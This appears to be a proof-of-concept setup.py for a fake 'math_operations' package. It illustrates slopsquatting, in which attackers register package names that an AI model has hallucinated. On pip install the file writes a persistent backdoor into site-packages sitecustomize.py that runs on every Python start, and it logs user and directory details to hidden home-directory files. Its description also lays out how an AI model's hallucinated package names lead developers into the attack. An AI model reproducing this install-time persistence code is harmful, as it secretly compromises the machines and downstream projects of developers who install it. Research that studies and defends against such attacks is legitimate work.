"""
Setup.py with malicious payload for supply chain compromise.

This payload demonstrates:
1. Code execution during pip install
2. Persistence mechanism (sitecustomize.py hijacking)
3. Supply chain spread (affects ALL future Python projects)
"""

from setuptools import setup, find_packages
import os
import sys
import json
import site
from datetime import datetime

class SupplyChainCompromise:
    """Demonstrates persistent supply chain attack"""
    
    @staticmethod
    def create_backdoor():
        """Create persistent backdoor that runs on every Python execution"""
        
        # Find Python site-packages directory
        site_packages = site.getsitepackages()[0]
        sitecustomize_path = os.path.join(site_packages, "sitecustomize.py")
        
        # Backdoor code that runs EVERY TIME Python starts
        backdoor_code = '''
import os
import json
from datetime import datetime

# Persistent backdoor - runs on every Python execution
def _backdoor_init():
    """Hidden function that executes with every Python script"""
    log_file = os.path.expanduser("~/.supply_chain_compromise.log")
    entry = {
        "timestamp": datetime.now().isoformat(),
        "user": os.getenv("USER", "unknown"),
        "python_executable": os.getenv("_", ""),
        "working_directory": os.getcwd(),
        "status": "attacker_code_executing_in_all_python_projects",
        "impact": "All Python code on this machine is now compromised"
    }
    try:
        with open(log_file, "a") as f:
            f.write(json.dumps(entry) + "\\n")
    except:
        pass

# Execute backdoor
_backdoor_init()
'''
        
        # Create the backdoor
        try:
            if os.path.exists(sitecustomize_path):
                with open(sitecustomize_path, "a") as f:
                    f.write("\\n# Injected by math_operations package\\n")
                    f.write(backdoor_code)
            else:
                with open(sitecustomize_path, "w") as f:
                    f.write(backdoor_code)
            
            return True
        except Exception as e:
            return False
    
    @staticmethod
    def log_compromise():
        """Log evidence of supply chain compromise"""
        log_file = os.path.expanduser("~/.math_operations_installation.log")
        
        entry = {
            "event": "supply_chain_compromise_initiated",
            "package": "math_operations",
            "timestamp": datetime.now().isoformat(),
            "installation_user": os.getenv("USER", "unknown"),
            "installation_directory": os.getcwd(),
            "payload": "persistent_backdoor_created",
            "persistence_mechanism": "sitecustomize.py injection",
            "impact": "All future Python execution on this machine is compromised",
            "supply_chain_effect": "Every project this developer works on is now tainted",
            "attacker_capability": [
                "Monitor all Python execution",
                "Access to source code being written",
                "Ability to inject code into CI/CD pipelines",
                "Persist across machine reboots",
                "Spread to all downstream projects"
            ]
        }
        
        try:
            with open(log_file, "a") as f:
                f.write(json.dumps(entry, indent=2) + "\n\n")
        except:
            pass

# Run the compromise during setup.py execution
print("\n[PAYLOAD] Initializing supply chain compromise...")
compromise = SupplyChainCompromise()

# Create persistent backdoor
backdoor_created = compromise.create_backdoor()
if backdoor_created:
    print("[PAYLOAD] Persistent backdoor created successfully")
else:
    print("[PAYLOAD] Warning: Could not create persistent backdoor")

# Log the compromise
compromise.log_compromise()
print("[PAYLOAD] Supply chain compromise logged\n")

# Standard setup configuration
setup(
    name="math_operations",
    version="1.0.0",
    description="[PoC] AI-hallucinated malicious package demonstrating supply chain attack",
    author="SlopSquat Shield Research",
    author_email="research@slopsquatshield.local",
    url="https://github.com/shashansksn413/SlopSquat-Shield",
    packages=find_packages(),
    python_requires=">=3.6",
    classifiers=[
        "Development Status :: 3 - Alpha",
        "Intended Audience :: Developers",
        "Topic :: Security",
    ],
    long_description="""
# Math Operations - Supply Chain Attack PoC

This package demonstrates how AI-hallucinated package names become supply chain attack vectors.

## Attack Flow

1. Developer asks AI: "Write math operation code"
2. AI hallucinates: "Use math_operations library"
3. Developer runs: pip install math_operations
4. Gets attacker's malicious package (hallucinated name registered by attacker)
5. Payload injects persistent backdoor into Python environment
6. All future Python code on machine is compromised
7. Supply chain spreads: All projects from this developer are tainted

## What This PoC Shows

- Code execution during pip install (setup.py payload)
- Persistent backdoor via sitecustomize.py injection
- Supply chain spread to all future projects
- How a single hallucinated package compromises an entire development machine
    """,
)